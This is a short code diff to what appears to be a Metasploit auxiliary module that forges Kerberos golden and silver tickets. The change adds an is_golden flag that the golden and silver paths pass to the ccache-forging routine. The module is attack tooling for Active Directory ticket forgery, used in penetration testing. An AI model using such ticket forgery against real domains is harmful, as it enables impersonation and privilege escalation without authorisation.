@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
 
   private
 
-  def forge_ccache(sname:, flags:)
+  def forge_ccache(sname:, flags:, is_golden:)
     enc_key, enc_type = get_enc_key_and_type
 
     start_time = Time.now.utc
@@ -97,7 +97,8 @@ class MetasploitModule < Msf::Auxiliary
       domain_sid: datastore['DOMAIN_SID'],
       extra_sids: extra_sids,
       session_key: datastore['SessionKey'].blank? ? nil : datastore['SessionKey'].strip,
-      ticket_checksum: datastore['IncludeTicketChecksum']
+      ticket_checksum: datastore['IncludeTicketChecksum'],
+      is_golden: is_golden
     )
 
     Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache, framework_module: self)
@@ -113,7 +114,7 @@ class MetasploitModule < Msf::Auxiliary
     validate_key!
     sname = datastore['SPN'].split('/', 2)
     flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
-    forge_ccache(sname: sname, flags: flags)
+    forge_ccache(sname: sname, flags: flags, is_golden: false)
   end
 
   def forge_golden
@@ -121,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
     validate_key!
     sname = ['krbtgt', datastore['DOMAIN'].upcase]
     flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
-    forge_ccache(sname: sname, flags: flags)
+    forge_ccache(sname: sname, flags: flags, is_golden: true)
   end
 
   def get_enc_key_and_type
